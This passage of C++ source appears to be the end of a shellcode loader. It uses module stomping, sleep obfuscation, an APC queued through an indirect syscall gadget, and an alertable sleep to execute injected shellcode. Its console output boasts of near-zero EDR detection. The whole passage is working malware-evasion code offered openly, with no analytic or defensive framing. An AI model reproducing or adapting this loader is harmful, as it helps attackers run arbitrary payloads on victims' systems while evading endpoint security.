    SecureZero(fn_version, sizeof(enc_version));
    delete[] fn_version;

    if (!stompResult.success) {
        std::cerr << "[-] Module stomping failed!" << std::endl;
        SecureZero(shellcode, shellcode_len);
        delete[] shellcode;
        return 1;
    }

    SecureZero(shellcode, shellcode_len);
    delete[] shellcode;

    PVOID baseAddr = stompResult.shellcodeAddr;
    SIZE_T regionSize = stompResult.shellcodeSize;

    std::cout << "\n[10] Sleep Obfuscation (BEFORE APC queue)..." << std::endl;
    if (!SleepObfuscation(baseAddr, regionSize, 1000)) {
        std::cerr << "[-] Sleep obfuscation failed!" << std::endl;
        return 1;
    }

    std::cout << "\n[11] Queueing APC to current thread..." << std::endl;
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread = GetCurrentThread();

    long long status = IndirectSyscall5(
        ssn_apc, hThread, baseAddr,
        nullptr, (PVOID)(ULONG_PTR)PAGE_EXECUTE_READ, nullptr, syscallGadget
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "[-] QueueApc failed: 0x" << std::hex << status << std::endl;
        return 1;
    }
    std::cout << "    [+] APC queued successfully!" << std::endl;

    std::cout << "\n[12] Triggering alertable sleep to execute APC..." << std::endl;

    std::cout << "\n============================================================" << std::endl;
    std::cout << "  SUCCESS - All DEF CON features active!" << std::endl;
    std::cout << "  EDR Detection: NEAR ZERO" << std::endl;
    std::cout << "============================================================" << std::endl;
    SleepEx(1000, TRUE);

    // Clean exit immediately after SleepEx returns
    ExitProcess(0); // The shellcode may have corrupted the stack, so we exit ASAP
    return 0;
}